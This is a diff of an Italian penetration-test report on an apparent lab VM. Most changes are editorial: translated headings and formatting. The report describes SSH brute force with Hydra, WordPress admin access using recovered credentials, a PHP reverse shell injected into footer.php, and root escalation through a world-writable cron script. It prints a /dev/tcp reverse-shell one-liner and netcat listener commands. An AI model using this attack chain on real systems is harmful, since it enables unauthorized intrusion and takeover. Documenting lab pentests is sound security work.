@@ -151,7 +151,9 @@ Information disclosure critico - la lista di utenti validi del sistema è stata 
 ### Fase 5: Attacco Brute Force SSH
 
 **Strumento:** Hydra  
+
 **Target Service:** SSH (port 22)  
+
 **Attack Type:** Dictionary-based brute force
 
 **Tentativo Iniziale (Fallito):**
@@ -181,7 +183,7 @@ Solo l'utente **anne** accetta l'autenticazione tramite password, gli altri uten
 
 ### Fase 7: Brute Force SSH Riuscito (Utente: anne)
 
-**Strumento:** Hydra (optimized parameters)  
+**Strumento:** Hydra
 
 **Comando:**
 ```bash
@@ -286,7 +288,6 @@ L'utente **anne** ha privilegi sudo completi senza restrizioni, permettendo l'es
 Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità critica in GNU Bash che permette l'esecuzione di codice arbitrario da remoto. Questa vulnerabilità è stata scoperta nel 2014 e colpisce versioni di Bash anteriori alla patch.
 
 **Technical Details:**
-- Bash interpreta erroneamente variabili d'ambiente che contengono definizioni di funzioni seguite da comandi
 - L'exploit permette l'esecuzione di comandi arbitrari attraverso richieste HTTP, CGI scripts, DHCP, etc.
 - CVSS Score: 10.0 (Maximum Severity)
 
@@ -294,7 +295,7 @@ Il sistema è vulnerabile a Shellshock (CVE-2014-6271), una vulnerabilità criti
 
 **Risultati Chiave:**
 - L'autenticazione ha permesso di identificare **95 vulnerabilità aggiuntive** non visibili senza credenziali
-- Il numero di vulnerabilità CRITICAL è aumentato da 2 a 15
+- Il numero di vulnerabilità CRITICAL è aumentato da 1 a 15
 - Identificate vulnerabilità nel kernel, nelle librerie di sistema, e nei pacchetti installati
 
 ---
@@ -389,6 +390,7 @@ Matching Modules
    -  ----                                               ---------------  ----    -----  -----------
    0  auxiliary/scanner/http/wordpress_login_enum        .                normal  No     WordPress Brute Force and User Enumeration Utility
 ```
+
 ![Testo alternativo](IMG/16_john_password.png)
 
 **Credenziali Ottenute:**
@@ -409,8 +411,10 @@ Matching Modules
 
 ### Fase 15: Accesso Pannello Admin WordPress
 
-**Metodo di Accesso:** Web Browser  
-**URL:** http://192.168.50.9/backup_wordpress/wp-login.php  
+**Metodo di Accesso:** Web Browser
+
+**URL:** http://192.168.50.9/backup_wordpress/wp-login.php 
+
 **Credentials:** john:enigma
 
 ![Testo alternativo](IMG/17_wp_login_php.png)
@@ -421,7 +425,6 @@ Matching Modules
 
 - Full administrative privileges
 - Access to theme editor
-- Access to plugin editor
 - Ability to upload files
 - Complete control over WordPress installation
 
@@ -429,46 +432,42 @@ Matching Modules
 
 ### Fase 16: Enumerazione Dashboard WordPress
 
-**WordPress Version Information:**
-```
-WordPress 4.5 is available! Please update now.
-WordPress 4.5 running Twenty Sixteen theme.
-```
-
 **Critical Finding:** Theme Editor accessible - permette la modifica diretta di file PHP del tema.
 
 ---
 
 ### Fase 17: Accesso Theme Editor per Iniezione Codice
 
-**Navigation:** Appearance → Editor  
-**Target File:** Twenty Sixteen: Theme Footer (footer.php)
+**Navigazione:** Appearance → Editor  
 
-**Current Code Visible:**
+**File Target:** Twenty Sixteen: Theme Footer (footer.php)
+
+**Theme Editor:**
 
 ![Testo alternativo](IMG/19_wp_editor.png)
 
-**Exploitation Strategy:**
+**Strategia di Exploitation:**
 Iniettare una reverse shell PHP nel file footer.php che verrà eseguito ad ogni caricamento di pagina del blog.
 
 ---
 
 ### Fase 18: Iniezione PHP Reverse Shell
 
-**Strumento:** Theme Editor (WordPress Admin Panel)  
-**Target File:** footer.php  
-**Payload:** PHP Reverse Shell
+**Strumento:** Theme Editor (WordPress Admin Panel) 
 
-**Reverse Shell Code Injected:**
+**File Target:** footer.php  
+
+**Tipo di Payload:** PHP Reverse Shell
+
+**Injection della Reverse Shell:**
 
 ![Testo alternativo](IMG/20_rev_shell.png)
 
-**Attack Configuration:**
+**Configurazione del Payload:**
 - **Attacker IP:** 192.168.50.5 (Kali Linux)
 - **Listening Port:** 4444
 - **Shell Type:** /bin/sh interactive shell
 
-**Code Placement:**
 Il codice della reverse shell è stato inserito al posto di quello del file footer.php, garantendo l'esecuzione automatica ogni volta che la pagina principale del sito viene caricata.
 
 **Gravità:** CRITICAL  
@@ -479,17 +478,18 @@ Il codice della reverse shell è stato inserito al posto di quello del file foot
 ### Fase 19: Configurazione Listener Netcat
 
 **Strumento:** Netcat  
+
 **Comando:**
 ```bash
 nc -lvnp 4444
 ```
 
-**Listener Status:**
+**Configurazione del Listener:**
 ```
 listening on [any] 4444 ...
 ```
 
-**Waiting for Connection:**
+**Listener in ascolto:**
 Il listener è in attesa che qualcuno carichi la home del WordPress blog, triggerando l'esecuzione della reverse shell.
 
 ---
@@ -497,9 +497,10 @@ Il listener è in attesa che qualcuno carichi la home del WordPress blog, trigge
 ### Fase 20: Connessione Reverse Shell Stabilita
 
 **Trigger:** Navigazione su qualsiasi pagina WordPress  
-**URL Example:** http://192.168.50.9/backup_wordpress/
 
-**Connection Established:**
+**URL Utilizzato:** http://192.168.50.9/backup_wordpress/
+
+**Connessione Stabilita:**
 
 ![Testo alternativo](IMG/22_shell_established.png)
 
@@ -513,7 +514,7 @@ Il listener è in attesa che qualcuno carichi la home del WordPress blog, trigge
 
 ![Testo alternativo](IMG/23_cron.png)
 
-**CRITICAL FINDING:**
+**Critical Finding:**
 ```
 *  *    * * *   root    /usr/local/bin/cleanup
 ```
@@ -522,24 +523,21 @@ Il listener è in attesa che qualcuno carichi la home del WordPress blog, trigge
 - Script eseguito **ogni minuto** come **root**
 - Potenziale vettore per privilege escalation se modificabile
 
-
-
-
 ---
 
 ### Fase 22: Analisi Permessi Script Cron
 
-**Script Examination:**
+**Analisi dello Script:**
 
 ![Testo alternativo](IMG/24_job_permissions.png)
 
-**CRITICAL SECURITY ISSUE:**
+**Critical Finding:**
 
 **Permessi:** `-rwxrwxrwx` (777)
 - **Owner:** root
 - **Group:** root
 
-**Vulnerability Details:**
+**Dettagli della Vulnerabilità:**
 - File eseguito come root ogni minuto via cron
 - Permessi 777 = qualsiasi utente può modificare il file
 
@@ -556,6 +554,7 @@ Qualsiasi utente sul sistema (incluso www-data) può modificare questo script e 
 ### Fase 23: Configurazione Listener per Shell Root
 
 **Strumento:** Netcat  
+
 **Comando:**
 ```bash
 nc -lvnp 443
@@ -566,27 +565,21 @@ nc -lvnp 443
 
 **Azione:** Modifica del cron script per privilege escalation
 
-**Original Content:**
+**Contenuto Originale:**
 ```bash
 #!/bin/sh
 rm -rf /var/log/apache2/*    # Clean those damn logs!!
 ```
 
-**Modified Content:**
+**Contenuto Malevolo:**
 
 ![Testo alternativo](IMG/26_edit_the_script.png)
 
-**Injected Payload:**
+**Il Payload - Reverse Shell TCP:**
 ```bash
 #!/bin/bash
 sh -i >& /dev/tcp/192.168.50.5/443 0>&1
 ```
-
-**Payload Explanation:**
-- `sh -i`: Interactive shell
-- `>&`: Redirect both stdout and stderr
-- `/dev/tcp/192.168.50.5/443`: TCP connection to attacker
-- `0>&1`: Redirect stdin to stdout (full interactive shell)
 
 **Execution Timeline:**
 Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà automaticamente la reverse shell come root.
@@ -595,11 +588,11 @@ Il cron job esegue lo script ogni minuto. Entro 60 secondi, il sistema eseguirà
 
 ### Fase 25: Accesso Root Ottenuto
 
-**Connection Received:**
+**Connessione Stabilita:**
 
 ![Testo alternativo](IMG/27_shell_access_as_root.png)
 
-**Attack Success:**
+**Attacco Completato con Successo:**
 Completa compromissione del sistema tramite:
 1. WordPress credentials brute force
 2. Theme Editor RCE
@@ -691,7 +684,6 @@ Questo penetration test ha identificato **condizioni di sicurezza estremamente c
 
 **Data del Report:** 27 Gennaio 2026  
 **Versione:** 2.0 - FINALE  
-**Stato:** COMPLETO - Entrambi i percorsi di attacco documentati
 
 ---
 
